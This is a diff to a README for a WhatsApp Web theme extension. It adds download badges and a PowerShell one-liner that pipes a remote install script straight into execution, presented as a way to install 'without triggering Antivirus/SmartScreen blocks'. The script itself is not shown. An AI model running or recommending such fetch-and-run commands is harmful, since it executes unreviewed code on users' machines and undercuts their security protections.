@@ -1,6 +1,17 @@
 # WhatsApp Themes
 
-Custom wallpapers and styling for WhatsApp Web.
+> **Custom wallpapers and styling for WhatsApp Web.**
+
+[![Download ZIP](https://img.shields.io/badge/Download-ZIP-orange?style=for-the-badge&logo=github)](https://github.com/ApexBlue11/WhatsApp-Themes-Extension/archive/refs/heads/main.zip)
+[![Download Installer](https://img.shields.io/badge/Download-Installer.bat-blue?style=for-the-badge&logo=windows)](https://github.com/ApexBlue11/WhatsApp-Themes-Extension/raw/main/install.bat)
+
+## ⚡ Windows Easy Install (Anti-Virus Safe)
+
+To install without downloading any executables or triggering Antivirus/SmartScreen blocks, open **PowerShell** and run this command:
+
+```powershell
+irm -useb https://raw.githubusercontent.com/ApexBlue11/WhatsApp-Themes-Extension/main/install.ps1 | iex
+```
 
 ## Features
 
